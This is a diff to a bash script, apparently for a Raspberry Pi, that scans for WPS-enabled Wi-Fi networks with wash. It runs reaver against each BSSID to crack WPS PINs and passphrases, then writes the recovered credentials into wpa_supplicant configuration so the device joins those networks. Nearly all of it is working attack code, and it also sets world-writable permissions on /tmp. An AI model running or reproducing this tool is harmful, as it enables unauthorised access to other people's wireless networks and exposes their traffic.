@@ -4,7 +4,7 @@
 #Color
  col='\033[0;33m'       # Yellow
  nc='\033[0m'       # No Color
-
+ 
 # Enable monitor-mode
 echo -e ${col} "Enabling monitor-mode" ${nc}
 
@@ -16,23 +16,26 @@ echo -e ${col} "Enabling monitor-mode" ${nc}
  sudo chmod 777 /home/pi/hs/
  sudo chmod 777 /tmp
 # cd /tmp
+echo "====================================================="
 
 # WPS network list
 echo -e ${col} "Scaning wps network for 30 sec" ${nc}
 
  sudo bash -c 'timeout 30s wash -i wlan1 > washout.txt'
  cat washout.txt
+ echo "====================================================="
 
 # Building bssid only list
- sudo rm bssid.txt
 echo -e ${col} "Creating bssid list" ${nc}
-
+  sudo rm bssid.txt
+  
  filename='washout.txt'
  while read -r line
  do
    id=$(cut -c-17 <<< "$line")
    echo $id  >> bssid
  done < "$filename"
+ echo "====================================================="
 
 # Remove B8:27:EB:6E:4D:2B mac of wlan0 from bssid list
  tail -n+3 bssid | sed -e 's/\<B8:27:EB:6E:4D:2B\>//g' | sed -r '/^\s*$/d' > bssid.txt
@@ -53,11 +56,15 @@ echo -e ${col} "Running reaver" ${nc}
  cat wps-pwned.txt
  cd ~/hs && md5sum  * | sort -t ' ' -k 4 -r | awk 'BEGIN{lasthash = ""} $1 == lasthash {print $2} {lasthash = $1}' | xargs rm && cd ~/
  find ~/hs -size 0 -print -delete
-
+echo "====================================================="
 
 # Adding cracked wifi to conf file
 
 a=tmpfile
+b=wpa_supplicant-wlan1.conf
+c=/etc/wpa_supplicant
+d=~/conf_bak
+
 grep -v "WPS PIN" wps-pwned.txt > $a
 sed -i 's/: /=/' $a
 sed -i 's/WPA/ /' $a
@@ -66,45 +73,47 @@ sed -i 's/+//' $a
 sed -i 's/PSK/psk/' $a
 sed -i 's/SSID/ssid/' $a
 sed -i 's/[][]//g' $a
+sed -i "s/'/\"/g" $a
+awk '!seen[$0]++' $a > a1 
+mv a1  $a
 
 sed -i 's/psk/network={ \n   psk/' $a
 sed -i 's/.*ssid.*/& \n   }\n/' $a
 
-cat $a
-echo -e ${col} "Cracked wifi added to wlan1 configuration" ${nc}
-
 echo "country=IN
 ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
-update_config=1" > header.conf
+update_config=1" > header
 
-cat tmpfile >> header.conf
-mkdir -p ~/conf_bak
-cp header.conf ~/conf_bak/wpa_supplicant-wlan1.conf
-find ~/conf_bak -size 0 -print -delete
+cat $a >> header
 
-sudo mkdir -p /etc/wpa_supplicant/backup
-sudo cp /etc/wpa_supplicant/wpa_supplicant-wlan1.conf /etc/wpa_supplicant/backup/wpa_supplicant-wlan1.conf.backup_`date +"%H:%M:%S:%d-%b-%Y"` 
-sudo find /etc/wpa_supplicant/ -size 0 -print -delete
-sudo bash -c 'cat tmpfile >> /etc/wpa_supplicant/wpa_supplicant-wlan1.conf'
-sudo awk '!seen[$0]++' /etc/wpa_supplicant/wpa_supplicant-wlan1.conf > /tmp/wpa_supplicant-wlan1.conf 
-sudo mv /tmp/wpa_supplicant-wlan1.conf /etc/wpa_supplicant/wpa_supplicant-wlan1.conf 
+mkdir -p $d
+sudo cp $c/$b $d/wpa_supplicant-wlan1.conf.backup_`date +"%H:%M:%S:%d-%b-%Y"` 
+sudo find $b -size 0 -print -delete
+sudo cp header $c/$b
+cp header $c/$b
 
-#rm -rf tmpfile*
+cat $c/$b
 
 echo -e ${col} "Cracked wifi added to configuration" ${nc}
+echo "====================================================="
 
 # Disabling monitor-mode and restore internet
 echo -e ${col} "Restoring manged-mode" ${nc}
  sudo ip link set wlan1 down
  sudo iw wlan1 set type managed
  sudo ip link set wlan1 up
-
-# Wifi connected status
-echo -e ${col} "Wifi connected status" ${nc}
-sleep 10 ; sudo wpa_cli -i wlan1 status | grep ssid
+echo "====================================================="
 
 echo -e ${col} "Finished!!" ${nc}
- sleep 10 ; ping -O -c 4 1.1
+
+ 
+ sleep 5
+ ping -O -c 4 1.1
+ echo "====================================================="
+ 
+ echo -e ${col} "Status of wifi connection" ${nc}
+ sudo wpa_cli -i wlan1 status
  
  #sudo systemctl restart wpa_supplicant@wlan1.service
  #sudo systemctl restart wpa_supplicant@wlan0.service
+ echo "====================================================="
